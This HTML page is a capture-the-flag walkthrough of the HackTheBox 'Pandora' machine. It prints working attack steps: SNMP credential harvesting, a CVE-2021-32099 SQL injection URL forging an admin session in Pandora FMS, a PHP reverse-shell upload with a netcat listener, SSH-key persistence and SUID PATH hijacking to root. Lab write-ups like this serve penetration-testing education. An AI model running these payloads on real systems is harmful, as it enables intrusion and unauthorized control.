@@ -1,0 +1,164 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Pandora HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/pandora-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-12-17T20:06:19+00:00">December 17, 2022</time><time class="updated" datetime="2025-06-19T19:57:20+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hack the box considers Pandora, a Linux computer, to be a simple box, but it isn’t. Instead of depending just on TCP port results, we will need to do another port scan with this box. After that, we will delve into the SNMP protocol and uncover some really intriguing information that will help us gain some initial access to the target computer. To find out which services are using the target’s internal port, we will then need to execute local port forwarding and horizontal privilege escalation. Then, in order to obtain a reverse shell as a different user, we will upload a malicious file and take advantage of the admin console’s SQL injection vulnerability. In the post-exploitation phase, we will abuse the SUID binary using path hijacking technique.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Initial Access</strong></span></p>
+<ul>
+<li><span style="color: #000000;">TCP Port Scan</span></li>
+<li><span style="color: #000000;">Enumeration</span></li>
+<li><span style="color: #000000;">UDP Port Scan</span></li>
+<li><span style="color: #000000;">SNMP Enumeration</span></li>
+<li><span style="color: #000000;">User Shell as Daniel</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Horizontal Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Enumeration</span></li>
+<li><span style="color: #000000;">Port Forwarding</span></li>
+<li><span style="color: #000000;">CVE-2021-32099 SQL injection Exploitation</span></li>
+<li><span style="color: #000000;">File Upload</span></li>
+<li><span style="color: #000000;">User Flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SSH Key Generate</span></li>
+<li><span style="color: #000000;">SUID Path hijack</span></li>
+<li><span style="color: #000000;">Root Flag</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s exploit it step by step.</span></p>
+<h3><span style="color: #800000;">Initial Access</span></h3>
+<p><span style="color: #000000;">We are going to start the assessment with the TCP/IP port scanning.</span></p>
+<h4><span style="color: #000080;"><strong>TCP Port Scan</strong></span></h4>
+<p><span style="color: #000000;">Let’s start with the port scan. We are using nmap to find out which ports are open so we can begin our port and service analyse. Nmap is a popular port scanning tool come with Kali Linux. In order to perform port scan, we have used <strong>-sC</strong> and <strong>-sV</strong> flags.</span></p>
+<p><span style="color: #000000;">Flags features:</span></p>
+<p><span style="color: #000000;"><strong>-sC</strong>   : Scans with default NSE scripts</span></p>
+<p><span style="color: #000000;"><strong>-sV</strong>   :  Attempts to determine the service version</span></p>
+<p><span style="color: #000000;"><strong>Command used:</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.26.243</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEggzEIOKKimE5TO1DEb1dOq1Ced9FfQ8yxFD_3qWtKitCIJhWX73NUNykwZV7qG1H-x_YZDGqQUagpjMCzorKJ21k4vkmh0BpM-cE_7qwPmeJqdTSS6qnmxwZZS_G7u7H8Yo9JH29XA5s1FfDUDZ1OYwTDsn7XrGgKuTEqOMd_S_PcwtYX0p40Yx7uoPg/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">From the nmap scan, we have found there were only two ports open, which are port <strong>80</strong> and port <strong>22</strong>. As usual <strong>HTTP service</strong> is running on port 80 and the <strong>SSH service </strong>is running on port 22. Http service is used for Webhosting and the SSH service is used for remote connection. SSH version is the latest and does not look vulnerable and the possible attack we can perform against the SSH service at this stage is bruteforce only which we might not need to. Instead of thinking about the SSH bruteforce let’s start enumerating port 80.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Enumeration</strong></span></span></h4>
+<p><span style="color: #000000;">We begin enumeration by accessing port 80 over the browser. The webpage does not have many interesting things, but we can see the domain name is available there which is <strong>Panda.htb</strong>. Next thing we can analyse what this website is made for, and what it does. Remember every website is created for some purpose with this mindset we assumed this website is serving games and network monitoring solutions.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">htttp://10.129.26.243</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqOXWdV-BU1atzeRt_jEHloQrnFNDjLuJdrer05e-OY-zJLwxnjpbd6eh5rRxVbDgjc4X2nY6E8cORDvyAy9Byn5GXrVPpmSRCvWYfWsEQjrWdLHx7zE2YZ7jg8Nb4uth35ULKEDAESt0ykZNiU1JxQKNh0ZdhBmJTZtsR5R84ZAL31y40rjRBwcMVug/s16000/2.png"/></strong></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>UDP Port Scan </strong></span></span></h4>
+<p><span style="color: #000000;">Got stuck for some time as we did not get any lead to get a foothold into the target system, we decided to perform a UDP port scan. When we do a normal nmap scan, it only scans TCP ports but not UDP so many time UDP ports may lead us to interesting findings. After the completion of the UDP port scan, we found that <strong>SNMP</strong> port is open on its default port which is <strong>port 161</strong>. Now we can go for further enumeration against the SNMP port but let’s talk about SNMP first.</span></p>
+<p><span style="color: #000000;"><strong>What is SNMP and what it is used for?</strong></span></p>
+<p><span style="color: #000000;">Simple Network Management Protocol (SNMP) is a networking protocol used for the monitoring and management of the network-connected end devices in the internet protocol networks. Multiple local devices such as routers, switches, servers, firewalls, and wireless access points embed it using IP addresses. It runs on <strong>UDP protocol</strong> and uses port <strong>161</strong> and <strong>162</strong> as its default port. </span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sU 10.129.26.243</pre>
+<p><span style="color: #000000;">Flags features:</span></p>
+<p><span style="color: #000000;"><strong>-sU</strong>: Scans UDP ports</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrMrWF_XbDQb-hOAxMz3E_V4OjNuGTJJ2XJZ_UsAj4nAwIlDXyDhcXL5Skzqa_T7gvd_EX26O4iQJa73hr8RmJfRpcfeMTTjI7apvP4GENN0X1tLC9J7grBbUuQf4O83VzQkQnTjaKL0PIcBMm-asrIp6WSVx9hsU1qqNWuDxozAaP1VlHpn4ns4IHPQ/s16000/3.png"/></strong></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>SNMP Enumeration</strong></span></span></h4>
+<p><span style="color: #000000;"> Once we found that the SNMP service is running and the port is open on 161, we are in the position to go for the further enumeration process. In order to enumerate SNMP service, we need to know what we are going to enumerate on that service which will give us important information that will be useful for future analysis and assessment. Whenever we come to enumerate SNMP, we need to focus on a couple of things such as <strong>Community Strings</strong> and <strong>versions. </strong>In most of cases, community strings is<strong> public </strong>and the version may be different in each case. There are three versions in the SNMP, which are V1, V2 and V3 which are differentiated by their features. In the table below we can see each version has different security features from weak to encrypted.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbJbPdiNTUmeELwvJAHrw1zkMb926A1K7UNtdX-m6TuzP64-S0NfYp4M_ZRgnD5596Kun3_qNXay0_YWV8fRlNqDvETybuNyORPpNHHLxEk6ixYTNQb95K12gGzCmjPT3tWtyRLrhltbBmJjYc1ct02V9xTBG3YUx0H_QPvXQMXkvFRK1ojyU-0-ZYsQ/s16000/50.png"/></p>
+<p><span style="color: #000000;">We will enumerate community strings and the version with <strong>snmp-check.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">snmp-check 10.129.26.243</pre>
+<p><span style="color: #000000;">With snmp-check, we have found that SNMPv1 is used, and the community string is public. Now we are in a position to enumerate further based on the community strings and the version. For that, we will use <strong>snmpwalk.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">snmpwalk -c public -v1 10.129.26.243</pre>
+<p><span style="color: #000000;">Snmpwalk has given an interesting finding here, if we scroll down, we will see there a username <strong>daniel </strong>and password <strong>HotelBabylon23</strong> is there. From here, we can think about login in via SSH as SSH port is open and we can test with found credentials.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgz5_wXSsESof1EcSHqAeEVVLcP3K4o5P1XNUJTug5twycEhpeG-FaTZV0BlNN5PANFDr7kuDkE8A1s5GnFkzDP3k6qKqu3p9E5GI5yXHQp4F6bmgcCdJtXoTy0153MA32MDu2xxiQQgU3Yx6pvXA6oZXaJ5t_hLsvWfJfvFbTzUgXmE_yKWHwFRY_0IA/s16000/4.png"/></span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIzhQc0atLMGu29RRqRXWw4aBoit3DSKfIscJ_nkVseoLGm7OfR9_TdUigJLJYiN9UMaOn1YtcnBVsSJlJ7Ct5h-3-Zd6wxg8XYvpYzOA8KlHj7N9YivOLB7_PIFBoOEBlRdQqDBpHtHnBQyBr0l2VrV1KTXQRR8evLJ20TuPca6M3WGnd8yUeMJ6dVQ/s16000/5.png"/></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>User Shell as Daniel</strong></span></span></h4>
+<p><span style="color: #000000;">We have successfully logged in as Daniel and tried to retrieve our user flag but unfortunately, we do not have permission to get the user flag as it is belonging to user <strong>matt</strong>. To retrieve the user flag, we need to compromise matt account then only it is possible to retrieve the flag contents?</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh daniel@10.129.26.243
+cd /home
+cd matt
+ls
+cat user.txt</pre>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNqb2KiKWgPSu5AzLSuu37iyqd7SX6hZqcAWcuzvgBFWcNOvGKta1ayhlQr87k5X-aES_aAuyp3K7ys7U7Kvd3eVBxdXYaL9doeIhERwIPW7sTHI7JG99MED_rY2WBRfQ4tas6wp6gtvYIVj9ZC9ixNx4kkX-A2JoP6Ypf1PG6Hw_ie0-tJPu433z_UA/s16000/6.png"/></strong></span></p>
+<h3><span style="color: #800000;">Horizontal Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Here we need to do a horizontal privilege escalation. There are two types of privilege escalations, one is vertical where we get the user shell and then just need to get root shell but, in our scenario, it does not apply, and we must go through a horizontal way where we need to compromise another user to escalate to root.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Enumeration</strong></span></span></h4>
+<p><span style="color: #000000;">Let’s transfer linpeas and check what it brings to us. Linpeas is an automated script which is useful to find the privilege escalation vectors in the target system. In the below picture we transferred <strong>linpeas.sh</strong> in the target <strong>/tmp</strong> directory and gave execute permission with <strong>chmod 777</strong> and simply executed.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+wget 10.10.14.3/linpeas.sh
+chmod 777 linpeas.sh
+./linpeas.sh</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieY8gDAt-YQtA5xLQEA7pHD8EqSIan2sbOQ5ZNYDYxmangWH191K4wCrb-dB8TWI-aILbyoK1VFDukN98skvdB6gYYXchGWhr5zqz-F_IseMSyH79Z_YwAIxwvmTAJf-XZevOdf9Jx8rwNyN79jBjBKNs7wftFy6mwvJobhS_Z9SiPJo3pun7ZyHzwng/s16000/6_1.png"/></strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpkT9BtNTPTAopP1c3HZh2aTG-y9FKqv_QyEeAYG4sDddXusJqzBlnk-Ub8YgamgtJQqEvXRwrX13MV9re10xDubJJ21EjF9ibK38SD0vQVJAX-mE5PSgpqJ69iAxxQaX4oTACjxaa0CdmTxtdT1o5HXbpN0IdEJs9u61Tu1nLvDZHlOZzg71SMphZpQ/s16000/6_2.png"/></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhS54nArAAM0A9bfjOkXXTJIoc_WW4ZmDQ8c6ehvTP6iRKGm1f2ZtS1CsV8VuZjTUChPWdykevkGK_FlFgp-1WjvGyWSo8m2xWfgBVBOpIURlbzOpa_n3PmFUigX9G4F_-TfUwF-p4g1acjqeFAcCumE58VGVSJwA61Fes_U9RWmI_khhredSt59GArkA/s16000/6_3.png"/></span></p>
+<p><span style="color: #000000;">From the linpeas result, we noticed a SUID <strong>pandora_backup</strong> is there which is an uncommon system binary, so we decided to find out more about it. Owner of this file is root, but matt has execution permission. Also, an internal server hosts the web, which is only accessible from the internal port. This means we cannot access it directly from our Kali machine, but if we manage to forward its local host port to our Kali machine, we can access it. If we give a closer look at the picture above, port 80 runs pandora.panda.htb, which is hosted from <strong>/var/www/pandora</strong>. Additionally, we can also assume it by checking the config file in which is available in the <strong>/etc/apache2/sites-enabled </strong>directory.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Port Forwarding</strong></span></span></h4>
+<p><span style="color: #000000;">As we know there is a service running on local port 80. We decided to use the local port forwarding technique here. It can be done from kali machine if we have valid credentials.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -L 8084:localhost:80 -N -f -l daniel 10.129.26.243</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhilHFfQkXLNAtfjn9fG6-P8cUJXicHlOsPvjLP2NSeeYpXJ97LKgYq5TRPW0aQxzR3U6E1xxAWpnyBXMpEHwkp4tnCZ99vsgM6J_XRzkAAVA6lUevQhz6OcVnUxFOj4fB37n8pjaOL4mkgJ3_I3qpa-LR-jKCIb8rsS16i0UVPiezmW2DpMq2_SRkyXg/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">Flags features:</span></p>
+<p><span style="color: #000000;"><strong>-L</strong>   : Listening port on Kali</span></p>
+<p><span style="color: #000000;"><strong>-N</strong>   : Do not execute any remote command</span></p>
+<p><span style="color: #000000;"><strong>-f</strong>   : Run in the background</span></p>
+<p><span style="color: #000000;"><strong>-l</strong>  : Username </span></p>
+<p><span style="color: #000000;">After local port forwarding, we can access the service which was running on the target internal port. An interesting finding came up and lead us to the pandora login console.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEghsy1UZE8TIw4fIUx4ngqaDh6-PuvCsGiB-zoY-Hd9TYmxqJ-reNUDdb5tyQBY8o1UWKQEYMLaEryd30rujCjvfjbBeG2g7n8BVlgfgcEna8l6VXSioLB2dkDw_znkWWcw0KzoKckZghQG-VPIQyhwyMBmakGQQQac9m5_aym9wxKw-0Rdc9Zxhkgy5Q/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">While enumerating the console we found a CMS with version is there on the right bottom side of the page: <strong>v7.0NG.742_FIX_PERL2020.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:8084/pandora_console/</pre>
+<p><span style="color: #000000;">After a few searches on google, we found Pandora FMS 742 is vulnerable to SQL injection. Detail information about the vulnerability can be found below:</span></p>
+<p><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</a></strong></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;">CVE-2021-32099 SQL Injection Exploitation</span></span></h4>
+<p><span style="color: #000000;">The blog had detailed information about the vulnerability but no POC or exploit code was available then we search for the CVE number so we can expand and filter our search on google to find out the exact resource that we are looking for. We found <strong>CVE-2021-32099</strong> belongs to this vulnerability and found an exploit encoded POC in the Github.</span></p>
+<p><span style="color: #000000;"><strong>Reference: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/ibnuuby/CVE-2021-32099">https://github.com/ibnuuby/CVE-2021-32099</a></span></strong></span></p>
+<p><span style="color: #000000;">We decoded the URL and tested this payload against the target.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>Decoded payload:</strong></span></span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:8084/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLPm2BttpxiRiiFelOL2qg9_OettE0vweY5GYciGBeVH46IKJXkb1w4AJ2u_qsHHnO6ko7ojXV5SfxWR3bh4mGRUhRirEyvHLM_OcyVNZKbtB6q0ZaUCnt2InRA9JgEesCf5hidp29TWVwxJ-EkKzEhUEn-5qnm81IYrhIHomwhpz2erGIqsCxJEv1Mw/s16000/9.png"/></span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>File Upload</strong></span></span></h4>
+<p><span style="color: #000000;">We successfully exploited the admin console and from here we can think about uploading a malicious file so we can get a reverse shell once it is executed. Whenever we come across the admin console, we see most of the time that admin has permission to upload file on CMS, with the same concept we upload a file by navigating <strong>admin tools</strong> then <strong>file manager</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRtTP7hsrSk-nkMUo_m0pzZOwFO3jnNZfz4M5hPSBMBzrxxfO6c_bpcgn9tCBXPgY4ZDp1ei-iEv8IbIp4pZ4ThbW3ZLBBZwf2Rx99JE8ztXaEznQ8cy0dw1uIxxlrLX-us8mrhbnN7FrFO2GqQlo87Lbq8c90mSIbBtx6Ycr4ffAN92tsb7fp5FZXlw/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">There is an <strong>up-arrow</strong> tab on the right side of the file manager which will let us upload a malicious file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhrmg5CXWsoYfbMueTLV7lTn13w11GHQmP0zumYaNB2ES6vLqH8fStMlnrPfSrE2iSOQB595UCN5qVU7nZIDht4fVUuEICOt25womcIV8fMHruBC8dgvD-oV15oTXmsWU2jDJHS8DKkDgLfgxyjfEo_r_67H0qF-7oKJeFfalwBtHJYyzsW51VEBHw_2Q/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Here we are going to upload a regular Pentest monkey’s PHP reverse shell which comes with the Kali and is available in the <strong>/usr/share/webshells/php</strong> directory named as <strong>php-reverse-shell.php</strong>. Next, we will copy this reverse shell to the to root directory and rename as <strong>shell.php</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiugD-TBkmT7Tbdxhe_ehtrjfUqM9kpkxyyxO8Sdc-jCbgXKrTFvkdaEeF-rZrz33hPLJol2AEfdWX7blkjWRH-xXDfwqEdoFVuOwTNCSMyCKPnqrv91pGFUePzeb7wcAsnOoM2vaWPro8F6bsmNtBRWUuzUZjoazwOnvdOXSpU81HDMP3M9J2yhTi7Kg/s16000/12.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /usr/share/webshells/php
+cp php-reverse-shell.php /root/shell.php</pre>
+<p><span style="color: #000000;">Once we copied the reverse shell to the root directory then we need to make a minor modification in the shell.php. We need to provide <strong>our</strong> <strong>IP address</strong> and the listening <strong>port number</strong> which is <strong>1234</strong> in order to get reverse connection back to our machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnRr94LxMVXBbj0AyF8zX1GQXxoM_3q9Hn585n2Be4xcaPNatc5i-9iU7Z60k-EFKQ7hTegQNo6qvgXt2TbpTVSJwR10-F-ZqVgdkZk9JF7oWCgxD4StXj4QSmiyUoMQyh7wAzOy_WKHsds_gS2VQhJe7SJXmGXSCqVwQwtv_jvUE1epo0iiOf0UP3nw/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">Now we are in the position to upload our malicious file to the CMS.  We can select <strong>browse</strong> tab and upload our file from there and <strong>press Go</strong>. Our file is uploaded and saved in the <strong>/images</strong> directory.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>User flag</strong></span></span></h4>
+<p><span style="color: #000000;">After uploading the malicious file, we can execute by accessing /the images directory over the browser along with our file name which is shell.php. Before accessing our uploaded file, we need to set netcat listener in our Kali machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzCgqrjUFE_8NtwFGU9aJOweY2mWkYQ1sZb3QhvrJ6JCTQ_HuJdgMlnDvVME2LX-gbiV30T1bT0cqmutgZ59fhjqBbq1gJ9jD4tRPF_2bgD-B4bwZ47e87tgXJ1qyN_-0DBNjfNjTV8jLzxAfBhq-0s4hetdhPSy2u_bUWIKbcUAX9yclnSnWIzA-B4w/s16000/15.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://localhost:8084/pandora_console/images/shell.php
+nc -lvp 1234</pre>
+<p><span style="color: #000000;">Then, once we set up the listener in our Kali machine, we can access the above URL to get the reverse connection back to our Kali machine. With reference above picture, we can see that we have successfully got a reverse shell as <strong>user matt</strong>. Now we can grab our <strong>user flag</strong> from the /home/matt/ directory.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhi5s6M3CTGLzkRGlQEtvbu80Ie2kxZapthagf4JvVlir3o5Rw-uh_uY14Qn7VmXUa0dLzmz55x9wJzUZUzTxXVxh8rEsZX6CMSZKCJuKWr6-cKZhM1Q2zCl3wHz_oPlo5ZWoBMAxpoULsS8H-oeIeKs4hXuO37X0GnJVA6N3cPv42yOflZdL9tOdNBWQ/s16000/17.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">We found a SUID binary from the linpeas output, but at that stage, we could not exploit it because we had Daniel’s shell instead of Matt’s shell, and Matt set his SUID with execute permission. Since Ltrace is pre-installed in the Pandora box, we can use this tool to enumerate the pandora_backup file. From the out, we can see that the program is saving backup to the /root/.backup directory without providing full path of the binary. So here the possible attack is to hijack its binary path. In order to do the path hijacking let’s get a stable fully interactive shell so we can perform our attack without any shell issues.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>SSH Key Generate</strong></span></span></h4>
+<p><span style="color: #000000;">We will generate an SSH key in our kali and save it as pandora. Two keys will be generated one is <strong>public key</strong> and another is <strong>private key</strong>. We need to transfer the public key to the target system. To send the file to the target system we need to set up a python server in our Kali on port 80, it is not mandatory to use port 80 we can use any port as our wish.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh-keygen -f pandora
+ls -la
+python3 -m http.server 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiwi-Yk3i_U6iKHnWqm0dkJf2jzjKiknSBGLiW5gv-ccAIbjexx-q6vni1QLVtoJPF2iXkakOgxrgCqJrhOzcsB89Ayqa0BeafFr4eEU5HNlYmpoOMDbUxzdmvznzDAjm2yd_A8gAOIydH5DaM_EGYYBcmbrbWr3vSHOWrdhM8iSr28Vwu-e6eX3srdEQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">Next, we need to transfer the public key in the matt user home directory. If there is no .ssh directory, then we need to create one, place the public key in the .ssh directory, change its name to authorized_keys, and provide the right permission to the .ssh directory where we keep the keys.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir .ssh
+cd .ssh
+wget 10.10.14.3/pandora.pub
+mv pandora.pub authorized_keys
+cd ..
+chmod +R 777 .ssh</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCMmiFrRPK9-_wNaXBKKLHybp93IHScBWp5T_0Ti7Hb-766gFufRJOJTuBaqHiRnxUrkDD_Nw5VEwgrDxDiTsyQxl5yv9ehSHyKywfpUcTVH7D1ahTDCXqkCPG7dC4mZRENCejstRzPjokNMViQ7vIeXezz2ZzCTrVeIi-t8mq8fsPeqjSOezXrnXRUQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">Once we followed the above steps then we need to give <strong>chmod 600</strong> permission to the private key which is stored in our Kali. Then, we will connect with the target system as matt using this private key. This part is a kind of maintaining persistence and gaining fully interactive shell as user matt. The main reason we are login in with the ssh key because we do not have user matt password and it can be very painful if we lose shell during the exploitation process.</span></p>
+<h4><span style="text-decoration: underline;"><span style="color: #000000; text-decoration: underline;"><strong>SUID Path Hijack</strong></span></span></h4>
+<p><span style="color: #000000;">Now we are in the position to abuse SUID tar binary. Let’s understand the methodology behind the attack. Whenever matt user executes the program pandora_backup then it will use tar command which has no binary path set so we will make a fake tar executable and put /bin/bash and set its binary path to our current path where our malicious tar executable is present.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
+echo "/bin/bash" &gt; tar
+chmod 777 tar
+export PATH=.:$PATH</pre>
+<h4><span style="text-decoration: underline; color: #000000;"><strong>Root Flag</strong></span></h4>
+<p><span style="color: #000000;">Once we set the path and if the matt executes the program, then it will execute tar from the path we have set, and it will spawn a root shell. Once root shell will spawn then we can grab our root flag from the /root directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">/usr/bin/pandora_backup
+cd /root
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgSFjEBES_BL6za4_hlEE124hl_eg8av9P6ijDmS4m04uh2rLtcy5G_7soDAPCp6BXatE3qncJatiqhNEBgQtys4lBHYd8R_w3gWjl_ri391ViYgVKIunOIZCILN7gfZ7hq3Dio46MF8stoiQ5CChrAgD1RaL9dFGsZvsCeKF5zIX32-_PSZXZr8YjrnQ/s16000/20.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Conclusion</span></span></h3>
+<p><span style="color: #000000;">This machine was fun and was a great source of learning, where we learned and explored so many things such as TCP port scan, UDP port scan, service enumeration, SNMP enumeration, port forwarding, SQL injection, malicious file upload, horizontal privilege escalation, ssh key generate, SUID path hijacking.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Subhash Paudel is a Penetration Tester and a CTF player who has a keen interest in various technologies and love to explore more and more. Additionally, he is a technical writer at Hacking articles. Contact here<strong>: <a href="https://au.linkedin.com/in/subhash-paudel-a021ab207">Linkedin</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
